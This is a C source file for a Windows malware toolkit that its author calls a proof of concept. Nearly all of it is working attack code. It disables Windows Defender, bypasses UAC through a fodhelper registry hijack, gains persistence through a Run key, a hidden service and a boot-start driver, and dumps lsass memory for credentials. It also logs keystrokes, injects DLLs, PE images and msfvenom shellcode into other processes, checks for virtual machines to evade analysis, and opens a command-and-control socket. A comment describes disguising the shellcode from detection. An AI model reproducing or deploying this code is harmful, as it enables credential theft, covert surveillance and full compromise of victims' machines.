//Running states
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN  
//Constant directories
#define PRESISTENCE_REGISTERY_PATH L"\"Software\\Microsoft\Windows\\CurrentVersion\\Run\""
#define HKCU_UAC_BYPASS_PATH L"Software\\Classes\\ms-settings\\shell\\open\\command"
#define SECURITY_ACCOUNT_MANAGER_PATH L"C:\\Windows\\System32\\config\\SAM"
#define COMMAND_LINE_PIPE  L"C:\\Users\\ilay\\Downloads\\ms-commands.txt"
#define COMMAND_LINE_EXECUTE " > C:\\Users\\ilay\\Downloads\\ms-commands.txt"
#define MALICIOUS_DRIVER_PATH L"c:\\Users\\ilay\\Downloads\\ms-mini.txt"
#define KEY_LOGGING_FILE_PATH L"c:\\Users\\ilay\\Downloads\\logging.txt"
#define MINI_DUMP_FILE  L"c:\\Users\\ilay\\Downloads\\Mini.txt"
#define DATA_FROM_INJECTION L"C:\\Windows\\System32\\Creds.txt"
#define HOOKER_DLL L"C:\\Users\\ilay\\source\\repos\\HookerDll\\x64\\Debug\\HookerDll.dll"
//other constants
#define PE_INJECTION_PROCESSA "notepad.exe"
#define PE_INJECTION_PROCESSW L"notepad.exe"
#define SENDING_HOUR 20  
#define DATA_LIMIT_SENDING 3000  
#define SECRET_SERVICE_NAME L"ms-SecretService"
#define SECRET_SERVICE_NAME_C "ms-SecretService"
#define KEY_PRESSING_STSTUS_CODE -32767
#define LSASS_NAME L"lsass.exe"
#define COMMAND_AND_CONTROL_ADDRESS "127.0.0.1"
#define PORT 8081
#define DEFAULT_BUFFER_LENGTH 512
#define KEYLOGGING_COMMAND "GetKeyStrokes"
#define DEBUG_PRIVS_NAME L"SeDebugPrivilege"
#define LSASS_PARSING_COMMAND "tasklist | findstr lsass.exe"
#define LSA_PREMISSION "Everyone"



//Headers
#include <Windows.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <stdlib.h>
#include <stdio.h>
#include <shlobj_core.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <minidumpapiset.h>
#include <NTSecAPI.h>
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")



//TURNING OFF WINDOWS DEFFENDER
int TurnWindowsDeffenderOff()
{
    HKEY hKey;
    DWORD dwValue = 1;
    DWORD dwSize = sizeof(DWORD);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
        printf("Error opening Windows Defender key\n");
        return 1;
    }

    if (RegSetValueEx(hKey, "DisableAntiSpyware", 0, REG_DWORD, (LPBYTE) &dwValue, dwSize) != ERROR_SUCCESS) {
        printf("Error setting DisableAntiSpyware value\n");
        return 1;
    }

    printf("Windows Defender has been disabled\n");
    RegCloseKey(hKey);
    return 0;
}
	

//strucs
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

//Privilege escelation modle
void UACBypass()
{
	//getting the current working directory 
	wchar_t DirName[1000];
	GetModuleFileNameW(NULL, DirName, 1000);

	//innitializing registery tree
	HKEY RegisteryKey;
	LONG RegKey = RegCreateKeyEx(HKEY_CURRENT_USER,
		HKCU_UAC_BYPASS_PATH,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		MAXIMUM_ALLOWED,
		NULL,
		&RegisteryKey,
		NULL);
	if (RegKey != ERROR_SUCCESS)
	{
		printf("%s", "Error while creating registery entry\n");
	}



	//setting malicious registery entries
	LONG Code = RegKey = RegSetValueEx(
		RegisteryKey,
		TEXT("DelegateExecute"),
		0,
		REG_SZ,
		TEXT(""),
		sizeof(TEXT("") + 1));

	if (Code != ERROR_SUCCESS)
	{
		printf("%s\n", "An error while setting registery value");
		exit(1);
	}



	Code = RegSetValueEx(
		RegisteryKey,
		TEXT(""),
		0,
		REG_SZ,
		DirName,
		sizeof(DirName) + 1);
	if (Code != ERROR_SUCCESS)
	{
		printf("%s\n", "An error while setting registery value");
		exit(1);
	}


	//Saving Changes
	RegCloseKey(RegisteryKey);
	//calling fodhelper.exe to execute the malware again and create an admin instance of it
	system("start fodhelper.exe"); //fodhelper.exe is responsible for different features in windows sttings

}


//(file handler,data to write)=>updated file
void WriteToFile(FILE* Handler, char Data)
{
	fprintf(Handler, Data);
	fprintf(Handler, " ");
}






//CommandLineExecution(no output redirection!)
char* RunCmdCommand(char* Command)
{
	system(Command);
}




//Checking weather the malware instance is running as an adminisitor
bool IsRunningAdmin()
{
	return IsUserAnAdmin();
}





//winapi hiding window
void HideOutputWindow()
{
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}




//winapi Show window
void ShowOutputWindow()
{
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 5);
}



// Keylogging option
int StartKeyLogging(HANDLE* FileHandler)
{

	fprintf(FileHandler, "Keylogging started\n");
	while (true)
	{

		bool CapsLocks = false;
		for (char Key = 8; Key < 256; Key++)
		{
			
			if (GetAsyncKeyState(Key) == KEY_PRESSING_STSTUS_CODE)
			{
				switch ((int)Key)
				{
				case 20:
					CapsLocks = true;
					break;
				case ' ':
					fprintf(FileHandler, "%s", "[SPACE] ");
					break;
				case 13:
					fprintf(FileHandler, "%s", "[ENTER] ");
					break;
				case 9:
					fprintf(FileHandler, "%s", "[TAB] ");
					break;
				case 8:
					fprintf(FileHandler, "%s", "[BACKSPACE] ");
					break;
				case 27:
					fprintf(FileHandler, "%s", "[ESCAPE] ");
					break;
				case 18:
					fprintf(FileHandler, "%s", "[ALT] ");
					break;
				case 19:
					fprintf(FileHandler, "%s", "[BREAK] ");
					break;
				case 16:
					fprintf(FileHandler, "%s", "[SHIFT] ");
					break;
				case 37:
					fprintf(FileHandler, "%s", "[LEFT-ARROW] ");
					break;
				case 38:
					fprintf(FileHandler, "%s", "[UP-ARROW] ");
					break;
				case 39:
					fprintf(FileHandler, "%s", "[RIGHT-ARROW] ");
					break;
				case 40:
					fprintf(FileHandler, "%s", "[DOWN-ARROW] ");
					break;
				case 45:
					fprintf(FileHandler, "%s", "[INSERT] ");
					break;
				case 46:
					fprintf(FileHandler, "%s", "[DELETE] ");
					break;

				default:
					if (CapsLocks)
					{
						fprintf(FileHandler, "%c", toupper(Key));
						fprintf(FileHandler, "%c", " ");

					}
					else
					{
						fprintf(FileHandler, "%c", tolower(Key));
						fprintf(FileHandler, "%c", " ");
					}
					break;

				}

			}
		}

	}

}






// Adds a registery key that will load the program at startup
void MakeMalwarePresistence()
{
	//Opening a registery key
	HKEY RegisteryKey = NULL;
	LONG CODE = RegOpenKeyW(HKEY_LOCAL_MACHINE, PRESISTENCE_REGISTERY_PATH, &RegisteryKey);
	if (CODE != ERROR_SUCCESS)
	{
		printf("%s", "Error while opening Registery key\n");
		exit(1);

	}

	//Retriving the malware's exe path
	wchar_t DirName[1000];
	GetModuleFileNameW(NULL, DirName, 1000);
	//printf("%s", DirName);

	//Creating a new Registery entry("PocReverseShell,<ExePath>)

	LONG Code = RegSetValueExW(
		RegisteryKey,
		TEXT("PocRansomware"),
		0,
		REG_SZ,
		DirName,
		sizeof(DirName) + 1);

	if (Code != ERROR_SUCCESS)
	{
		printf("%s", "Error while inserting a new registery entry\n");
		exit(1);
	}
	//Closing Registery and saving changes
	RegCloseKey(RegisteryKey);
	//in case of success the program will load at startup
}






void CreateOwnService()
{
	//retriving path to executable
	wchar_t DirName[1000];
	GetModuleFileNameW(NULL, DirName, 1000);


	//Service Managment handler
	SC_HANDLE ServiceManagerHandler = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	//Service Handler
	SC_HANDLE ServiceHandler = CreateService(
		ServiceManagerHandler,
		SECRET_SERVICE_NAME,
		SECRET_SERVICE_NAME,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		DirName,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);


	//Checking if service had been created
	if (ServiceHandler == NULL)
	{
		printf("CreateService failed (%d)\n", GetLastError());	
		exit(1);
	}
	//Closing the service handler and the Service Managaer Handler
	CloseServiceHandle(ServiceHandler);
	CloseServiceHandle(ServiceManagerHandler);


	//Service had been created successfully
	printf("%s", "Service Created Successfully!\n"); 
	//CloseServiceHandle(ServiceHandler);

	if (StartServiceW(ServiceHandler, 0, NULL) == 0)
	{
		printf("ServiceStarting has failed (%d)", GetLastError());


	}

}






void ConfigureMaliciousDriver(wchar_t* DriverPath)
{

	//The program uses its high priveleges in order to configure a new service to a malicious driver/
	//by doing that the program will gain a full access to the kernrl!

	wchar_t* DriverFullPath = DriverPath;
	//Service Managment handler
	SC_HANDLE ServiceManagerHandler = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);


	//Service Handler

	//NOTE! path must contain system root in order to be a boot driver
	SC_HANDLE ServiceHandler = CreateService(
		ServiceManagerHandler,
		TEXT("m1c440$0ft-l3g1t1m4t31c-D41v3r"),
		TEXT("ms-microsoftware"),
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_BOOT_START,//Note!-set DEMAND to avoid BSOD
		SERVICE_ERROR_IGNORE,
		DriverFullPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);


	//Checking if service had been created
	if (ServiceHandler == NULL)
	{
		printf("Service creation has failed (%d)\n", GetLastError());
		exit(1);
	}

	//Service had been created successfully
	printf("%s", "Service Created Successfully!\n");
	CloseServiceHandle(ServiceHandler);


	//starting service

	if (StartServiceW(ServiceHandler, 0, NULL) == 0)
	{
		printf("ServiceStarting has failed (%d)", GetLastError());

	}

}




//CMD Output Redirection
char* GetCommandLineOutPut(char* Command)
{
	//Starting empty buffers with NULLS
	char* Buffer   = (char*)calloc(2048, sizeof(char));
	char* FinalOutput = (char*)calloc(100000, sizeof(char));
	//Checking if the memory allocated
	if (Buffer && FinalOutput == NULL)
	{
		printf("Error allocating memory(%d)", GetLastError());
	}


	FILE* FileHandler;
	FileHandler = _popen(Command, "r");
	while (fgets(Buffer, 2048, FileHandler) != NULL)
	{
		strcat(FinalOutput, Buffer);
	}


	fclose(FileHandler);
	return FinalOutput;  //Note-freeing Final output!!

}

char* ReadKeyloggingData(FILE* KeyLoggingFile)
{

	//Getting file size
	long Size;
	fseek(KeyLoggingFile, 0L, SEEK_END);
	Size = ftell(KeyLoggingFile);
	rewind(KeyLoggingFile);

	//Starting empty buffers with NULLS
	char* Buffer = (char*)calloc(1024, sizeof(char));
	char* FinalOutput = (char*)calloc(Size, sizeof(char));

	if (Buffer && FinalOutput == NULL)
	{
		printf("Error allocating memory(%d)", GetLastError());
	}

	//Copieng from file to char*
	while (fgets(Buffer, 1024, KeyLoggingFile) != NULL)
	{
		strcat(FinalOutput, Buffer);
	}
	//Flushing current content 
	freopen(KEY_LOGGING_FILE_PATH, "w", KeyLoggingFile);
	free(Buffer);
	//()=>KeyLogging data
	return FinalOutput;

}




void SendDataToServer(char* Data, SOCKET* socket)
{
	if (send(socket, Data, strlen(Data), 0) < 0)
	{
		printf("A socket error(%d)", GetLastError());
	}
}




char* GetDataFromServer(SOCKET* Socket)
{
	char* Buffer = (char*)calloc(18000, sizeof(char));
	if (recv(Socket, Buffer, 18000, 0) < 0)
	{
		printf("Socket error(%d)", GetLastError());

	}
	return Buffer;
	//Note!-Free the memory of the Buffer
}





int IsServiceRunning()
{

	int Length = strlen("sc queryex type= service state= all | findstr ") + strlen("ms-Microsoft-Essentials") + 1;
	char Command[100] = "sc queryex type= service state= all | findstr ";
	char Argument[] = SECRET_SERVICE_NAME_C;
	strcat(Command, Argument); //connecting to strings to the command: 
	//sc queryex type= service state= all
	//| findstr ms-Microsoft-Essentials
    //Executing the command
	char* Service = GetCommandLineOutPut(Command);
	int Exists = strstr(Service, Argument);
	return Exists;




}



int GetLsassProcessIdentifier()
{
	//getting the output of cmd command "tasklist | findstr lsass.exe"
	//the output is some data of the lsass process
	char* Out = GetCommandLineOutPut("tasklist | findstr lsass.exe");

	//Parsing the data of lsass 
	char* ProcessId = strtok(Out, " ");

	//taking the first token which is the pid
    ProcessId = strtok(NULL, " ");

	//converting it to int
	int IntProcessId;
	sscanf(ProcessId, "%d", &IntProcessId);
	//returning lsass's pid
	return IntProcessId;

}



BOOL GainDebuggingPrivilege()
{
	HANDLE PrivilegeToken;
	TOKEN_PRIVILEGES PrivilegeData;
	//uniqe locally uniqe identifier
	LUID Luid;



	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &PrivilegeToken))
	{
		printf("OpenProcessToken Error(%d)\n", GetLastError());
		return FALSE;

	}



	//retriving current process's token handler
	if (!LookupPrivilegeValue(0, DEBUG_PRIVS_NAME, &Luid))
	{
		printf("LookupPrivilege Error(%d)\n", GetLastError());
		return FALSE;
	}

	PrivilegeData.Privileges[0].Luid = Luid;
	PrivilegeData.PrivilegeCount = 1;
	PrivilegeData.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(PrivilegeToken, FALSE, &PrivilegeData, 0,0, 0))
	{
		printf("AdjustPrivilegeError(%d)\n",GetLastError());
		return FALSE;
	}

	CloseHandle(PrivilegeToken);
	return TRUE;


}



char* GetAccoumtName()
{
	return GetCommandLineOutPut("whoami");
}

void SetDebugPrivilegeForAdmin()
{
	
	LSA_UNICODE_STRING LusName;
	NTSTATUS Status;
	LSA_HANDLE LSAHanler;
	LSA_OBJECT_ATTRIBUTES ObjectAttributes;
	wchar_t* SysName = NULL;
	USHORT SystemNameLength;
	
	ZeroMemory(&ObjectAttributes, sizeof(ObjectAttributes));

	SystemNameLength = wcslen(SysName);
	LusName.Buffer = SysName;
	LusName.Length = SystemNameLength * sizeof(WCHAR);
	LusName.MaximumLength = (SystemNameLength + 1) * sizeof(WCHAR);

	Status = LsaOpenPolicy(
		&LusName,    //Name of the target system.
		&ObjectAttributes, //Object attributes.
		POLICY_ALL_ACCESS, //Desired access permissions.
		&LSAHanler //Receives the policy handle.
	);



}




char* DumpLsassExe()
{
	//starting lsass
	system("start lsass");
	//Creting lsass's process handler
	DWORD ProcessId = (DWORD)GetLsassProcessIdentifier();
	HANDLE LsassHandler;
	LsassHandler= OpenProcess
	(
		PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 
		0, 
		ProcessId
	);

	if (LsassHandler == NULL)
	{
		printf("Lsass Error(%d)\n", GetLastError());
	}
	
	//Creating a text file to hold the dumped lsass data
	HANDLE LsassMinidump = CreateFileW
	(MINI_DUMP_FILE, GENERIC_READ | GENERIC_WRITE,
		0,
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_ARCHIVE | SECURITY_IMPERSONATION, 
		NULL);
	
	if(LsassMinidump == NULL)
	{
		printf("Output Error(%d)\n", GetLastError());
	}

	//Creaing dumped datat to the file
	int code=MiniDumpWriteDump(
		LsassHandler, 
		ProcessId, 
		LsassMinidump, 
		(MINIDUMP_TYPE)0x00000002,
		NULL,
		NULL,
		NULL);
	CloseHandle(LsassMinidump);

	
}



void RemoteShellcodeExecuetion(DWORD ProcessId,char*Shellcode)
{
	HANDLE Process, Thread;
	LPVOID ReservedMemory;

	Process = OpenProcess(
		PROCESS_ALL_ACCESS,
		TRUE,
		ProcessId);

	ReservedMemory=VirtualAllocEx(Process,
		NULL, 
		sizeof(Shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(Process,
		ReservedMemory,
		Shellcode, 
		sizeof(Shellcode), 
		NULL);

    Thread = CreateRemoteThread(Process,
		NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)ReservedMemory,
		NULL, 
		0, 
		NULL);

	CloseHandle(Process);




}















int ValidateManufatorer()

{
	int ret;
	char* Command = GetCommandLineOutPut("An Error while searching for diturbing Services");
	if (strstr(Command, "VM") == NULL || strstr(Command, "VirtualBox") || strstr(Command, "vm"))
	{
		free(Command);
		return 0;
	}
	free(Command);
	return 1;
}



int ValidateBiosId()
{
	char* Command;
	Command = GetCommandLineOutPut("wmic bios get serialnumber");
	Command=strtok(Command, "\n");
	Command = strtok(NULL, "\n");
	int i = 0;
	while (*(Command + i) != ' ')
	{
		i++;
	}
	Command[i] = '\0';
	int NumberOfDigits=strlen(Command);
	if (NumberOfDigits > 25)
	{
		return 0;
	}
	return 1;

	

}

int RemoteDllInjection(int Pid )
{
	HANDLE Process,Thread;
	PVOID RemoteBuffer;
	wchar_t HookerPath[] = HOOKER_DLL;

	Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)Pid);

	RemoteBuffer = VirtualAllocEx(Process, NULL, sizeof (HookerPath), MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(Process, RemoteBuffer, (LPVOID)HookerPath, sizeof (HookerPath), NULL);

	PTHREAD_START_ROUTINE Address = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	Thread=CreateRemoteThread(Process, NULL, 0, Address, RemoteBuffer, 0, NULL);

	CloseHandle(Process);
	return GetThreadId(Thread);



}



DWORD InjectionEntryPoint()
{
	//HideOutputWindow();
	CHAR moduleName[128] = "";
	GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
	while (TRUE)
	{
		MessageBoxA(NULL, moduleName, "My malware is now injected into RuntimeBroker!", NULL);
	}

	return 0;
}










int ProcessInjection()
{
	//starting the process to get injected intoo
	system("start RuntimeBroker.exe");
	//getting the output of cmd command "tasklist | findstr <RemoteprocessName>.exe"
	//the output is some data of the Remote process
	char* Out = GetCommandLineOutPut("tasklist | findstr RuntimeBroker.exe");

	//Parsing the data of Remote Process 
	char* ProcessId = strtok(Out, " ");

	//taking the first token which is the pid
	ProcessId = strtok(NULL, " ");

	//converting it to int
	int IntProcessId;
	sscanf(ProcessId, "%d", &IntProcessId);



	//The current exe image base addr. the first header in the exe is the DOS-HEADER.
	//Any addr in the exe is relative to the image base (RVA).
	PVOID CurrentImage = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)CurrentImage;




	//Inside the DOS-HEADER the e_lfanew field contains 
	//the addr of the next hedaer, the NT-HEADER
	//in order to get the actual address of NTHEDAER and not just the rva the
	//addres will be the sum of the image base and the elfnaw
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)CurrentImage + DosHeader->e_lfanew);


	// Allocating a new memory block that will contain the while PE image
	PVOID MainImage = VirtualAlloc(
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_READWRITE);


	//copying the curent PE image to a temp memory block
	memcpy(MainImage,
		CurrentImage,
		NtHeader->OptionalHeader.SizeOfImage);

	//Openning the remote process prior to the process identifier extracted from tasklist
	HANDLE RemoteInjectedProcess = OpenProcess(
		MAXIMUM_ALLOWED,
		FALSE,
		(DWORD)IntProcessId);


	// Allocating a new memory block on the target process
	PVOID targetImage = VirtualAllocEx(
		RemoteInjectedProcess,
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	//because of the fact that the process will be loaded into a new image,
	//it's image base addr might be changed but the other addreses in the relocation
	//table remain the same so we must change the values in the reloc table prior the 
	//change in the image base addrs
	//now ill edit the copy of the image relocation table so that the new 
	//process will be able to resolve the adresses currectly
	DWORD_PTR DifferenceBetweenImages = (DWORD_PTR)targetImage - (DWORD_PTR)CurrentImage;



	PDWORD_PTR PatchedAddresses;

	PBASE_RELOCATION_ENTRY RelocTableRelativeAddress = 0;



	//getting to the relocation table of the
	//memory copy by adding the base image with the 
	//RVA of nthedaer=>optionalheader=>DataDirectories=>virtual address
	PIMAGE_BASE_RELOCATION RelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)MainImage + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	//will be used in the inner loop in order to iterate each relocation entry
	DWORD RelocEntriesCounter = 0;



	while (RelocTable->SizeOfBlock > 0)
	{
		//the number of entries is calculating by getting to the relocation's table block,
		// the block size that contains the size of the image base relocation.
		//by substracting the image base relocation size well get the size only 
		//of the block. each block contains 2 bytes, 1 for address and 1 for type
		RelocEntriesCounter = (RelocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / (sizeof(int) / 2);
		//proceeding blocks
		RelocTableRelativeAddress = (PBASE_RELOCATION_ENTRY)(RelocTable + 1);

		for (short i = 0; i < RelocEntriesCounter; i++)
		{
			if (RelocTableRelativeAddress[i].Offset == 1)
			{
				PatchedAddresses = (PDWORD_PTR)((DWORD_PTR)MainImage + RelocTable->VirtualAddress + RelocTableRelativeAddress[i].Offset);
				*PatchedAddresses += DifferenceBetweenImages;
			}
		}
		RelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)RelocTable + RelocTable->SizeOfBlock);
	}

	// Write the relocated localImage into the target process
	WriteProcessMemory(
		RemoteInjectedProcess,
		targetImage,
		MainImage,
		NtHeader->OptionalHeader.SizeOfImage,
		NULL);

	// Start the injected PE inside the target process
	CreateRemoteThread(
		RemoteInjectedProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + DifferenceBetweenImages),
		NULL,
		0,
		NULL);

	return 0;
}









int main()
{
	IMPORTANAT!!!
	#########################################################################
	#########################################################################
	#########################################################################
	I changed the main function of the malware on purpose so it wont be malicious
	once compiled and in order to test each function and add new malicious features.
	that is not the actual main function!! the original is kept in secrecy :)
	#########################################################################
	#########################################################################
	#########################################################################
	
	//Hiding the whole user console by using winapi "ShowWindow"
	//HideOutputWindow();
	// 
	////////////////////////////////////////
	//From now on every instance is invisible
	/////////////////////////////////////////



	
// HKCU_UAC_BYPASS_PATH L"Software\\Classes\\ms-settings\\shell\\open\\command"
	printf("%s\n", IsUserAnAdmin() ? "Yes is an admin!" : "No is not an admin!");


	//Adminisitor check
	if (!IsRunningAdmin()==1)
	{
		//this code happens as  non admin
		UACBypass();
		//waits for the payload
		Sleep(10000);
		//exits
		exit(1);
	}


	printf("%s\n", IsUserAnAdmin() ? "Yes is an admin!" : "No is not an admin!");



	

	/////////////////////////////////////////
	//This section happens as an adminisitor and can be injected into runtime broker!!
	/////////////////////////////////////////
	char* command = (char*)malloc(300 * sizeof(char));
	printf("%s", "Enter a command to execute=>");
	scanf("%s",command);
	char *output=GetCommandLineOutPut(command);
	printf("Command line output is=> %s\n", output);

	printf("%s", "Press enter to dump lsass=>\n");
	scanf("%s",command);
	GainDebuggingPrivilege();
	DumpLsassExe();
	scanf("%s", command);
	printf("%s", "Lsass is dumped!, check the dump file!\n Press enter to start injecting into runtimebroker.exe=>\n");
	ProcessInjection();
	scanf("%s", command);
	printf("%s", "our whole process is now injected into runtimebroker.exe!, prsess enter to inject a dll into a given pid and hook its procid function and it will display its whole dlls! =>\n");
	int pid = 0;
	scanf("%d", &pid);
	printf("%s", "IAT HOOKING STARTED...\n");
	
	RemoteDllInjection(pid);
	scanf("%s", command);

	printf("%s", "Now lets make it presistence by inserting in to the registery=>\n"); // PRESISTENCE_REGISTERY_PATH L"\"Software\\Microsoft\Windows\\CurrentVersion\\Run\""
	MakeMalwarePresistence();
	scanf("%s", command);

	
	//critical note!!!
	//i added a null chacracter at the end of the msfvenom shellcode so that vs wont see that as a malicious shellcode!!!!!!
	//remove it then compile!
	//do not use for any harm!
	char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\x1d\xbe\xa2\x7b\x2b\x90\xe1\xec\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe1\xf6\x21\x9f\xdb\x78"
		"\x21\xec\x1d\xbe\xe3\x2a\x6a\xc0\xb3\xbd\x4b\xf6\x93\xa9\x4e"
		"\xd8\x6a\xbe\x7d\xf6\x29\x29\x33\xd8\x6a\xbe\x3d\xf6\x29\x09"
		"\x7b\xd8\xee\x5b\x57\xf4\xef\x4a\xe2\xd8\xd0\x2c\xb1\x82\xc3"
		"\x07\x29\xbc\xc1\xad\xdc\x77\xaf\x3a\x2a\x51\x03\x01\x4f\xff"
		"\xf3\x33\xa0\xc2\xc1\x67\x5f\x82\xea\x7a\xfb\x1b\x61\x64\x1d"
		"\xbe\xa2\x33\xae\x50\x95\x8b\x55\xbf\x72\x2b\xa0\xd8\xf9\xa8"
		"\x96\xfe\x82\x32\x2a\x40\x02\xba\x55\x41\x6b\x3a\xa0\xa4\x69"
		"\xa4\x1c\x68\xef\x4a\xe2\xd8\xd0\x2c\xb1\xff\x63\xb2\x26\xd1"
		"\xe0\x2d\x25\x5e\xd7\x8a\x67\x93\xad\xc8\x15\xfb\x9b\xaa\x5e"
		"\x48\xb9\xa8\x96\xfe\x86\x32\x2a\x40\x87\xad\x96\xb2\xea\x3f"
		"\xa0\xd0\xfd\xa5\x1c\x6e\xe3\xf0\x2f\x18\xa9\xed\xcd\xff\xfa"
		"\x3a\x73\xce\xb8\xb6\x5c\xe6\xe3\x22\x6a\xca\xa9\x6f\xf1\x9e"
		"\xe3\x29\xd4\x70\xb9\xad\x44\xe4\xea\xf0\x39\x79\xb6\x13\xe2"
		"\x41\xff\x32\x95\xe7\x92\xde\x42\x8d\x90\x7b\x2b\xd1\xb7\xa5"
		"\x94\x58\xea\xfa\xc7\x30\xe0\xec\x1d\xf7\x2b\x9e\x62\x2c\xe3"
		"\xec\x1c\x05\xa8\x7b\x2b\x95\xa0\xb8\x54\x37\x46\x37\xa2\x61"
		"\xa0\x56\x51\xc9\x84\x7c\xd4\x45\xad\x65\xf7\xd6\xa3\x7a\x2b"
		"\x90\xb8\xad\xa7\x97\x22\x10\x2b\x6f\x34\xbc\x4d\xf3\x93\xb2"
		"\x66\xa1\x21\xa4\xe2\x7e\xea\xf2\xe9\xd8\x1e\x2c\x55\x37\x63"
		"\x3a\x91\x7a\xee\x33\xfd\x41\x77\x33\xa2\x57\x8b\xfc\x5c\xe6"
		"\xee\xf2\xc9\xd8\x68\x15\x5c\x04\x3b\xde\x5f\xf1\x1e\x39\x55"
		"\x3f\x66\x3b\x29\x90\xe1\xa5\xa5\xdd\xcf\x1f\x2b\x90\xe1\xec"
		"\x1d\xff\xf2\x3a\x7b\xd8\x68\x0e\x4a\xe9\xf5\x36\x1a\x50\x8b"
		"\xe1\x44\xff\xf2\x99\xd7\xf6\x26\xa8\x39\xea\xa3\x7a\x63\x1d"
		"\xa5\xc8\x05\x78\xa2\x13\x63\x19\x07\xba\x4d\xff\xf2\x3a\x7b"
		"\xd1\xb1\xa5\xe2\x7e\xe3\x2b\x62\x6f\x29\xa1\x94\x7f\xee\xf2"
		"\xea\xd1\x5b\x95\xd1\x81\x24\x84\xfe\xd8\xd0\x3e\x55\x41\x68"
		"\xf0\x25\xd1\x5b\xe4\x9a\xa3\xc2\x84\xfe\x2b\x11\x59\xbf\xe8"
		"\xe3\xc1\x8d\x05\x5c\x71\xe2\x6b\xea\xf8\xef\xb8\xdd\xea\x61"
		"\xb4\x22\x80\xcb\xe5\xe4\x57\x5a\xad\xd0\x14\x41\x90\xb8\xad"
		"\x94\x64\x5d\xae\x2b\x90\xe1\xec\x00";
	;
	printf("%s", "Inject an assembly shellcode remoteley =>\n");
	RemoteShellcodeExecuetion(pid, shellcode);







	//Socket Creation
	SOCKET Socket;
	struct sockaddr_in SocketAddr;
	WSADATA WSA;
	char* IpAddress = COMMAND_AND_CONTROL_ADDRESS;
	int Port = PORT;
	//starting WSA
	WSAStartup(MAKEWORD(2, 2), &WSA);

	//The communication socket
	Socket = socket(AF_INET, SOCK_STREAM, 0);
	//The communication socket


	//setting server's address
	SocketAddr.sin_port = htons(Port);
	SocketAddr.sin_addr.s_addr = inet_addr(IpAddress);
	SocketAddr.sin_family = AF_INET;


	//Connecting to the server
	int code = connect(Socket, (struct sockaddr*)&SocketAddr, sizeof(SocketAddr));
	if (code < 0)
	{
		printf("Socket error(%d)", GetLastError());
	}
	// Socket Creation

	//Key Logger setup

	//Keylogging File Creation 
	

}
